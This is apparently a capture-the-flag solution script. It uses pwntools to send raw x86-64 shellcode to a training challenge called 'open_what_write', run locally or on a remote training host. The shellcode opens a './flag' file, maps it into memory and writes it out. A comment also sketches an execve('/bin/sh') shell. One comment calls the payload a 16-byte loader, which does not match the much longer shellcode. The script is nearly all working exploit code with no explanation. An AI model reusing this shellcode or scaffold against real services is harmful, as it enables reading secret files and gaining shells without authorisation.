from pwn import *

COMMANDS = """
"""

shellcode = b"\x48\xB8\x2E\x2F\x66\x6C\x61\x67\x00\x00\x50\x48\xC7\xC0\x02\x00\x00\x00\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x0F\x05\x49\x89\xC4\x48\x31\xFF\x48\xC7\xC6\x00\x10\x00\x00\x48\xC7\xC2\x01\x00\x00\x00\x49\xC7\xC2\x02\x00\x00\x00\x4D\x89\xE0\x4D\x31\xC9\x48\xC7\xC0\x09\x00\x00\x00\x0F\x05\x49\x89\xC5\x48\xC7\xC7\x01\x00\x00\x00\x4C\x89\xEE\x48\xC7\xC2\x00\x10\x00\x00\x48\xC7\xC0\x01\x00\x00\x00\x0F\x05\x4C\x89\xE7\x48\xC7\xC0\x03\x00\x00\x00\x0F\x05\x48\x31\xFF\x48\xC7\xC0\x3C\x00\x00\x00\x0F\x05"

if args.GDB:
    p = gdb.debug("./open_what_write", gdbscript=COMMANDS)
elif args.REMOTE:
    p = remote("open-what-write.training.offensivedefensive.it", 8080, ssl=True)
else:
    p = process("./open_what_write")

# Send first stage loader (exactly 16 bytes)
p.send(shellcode)

p.interactive()

#execve("/bin/sh\0", NULL, NULL)
#0x0068732f6e69622f

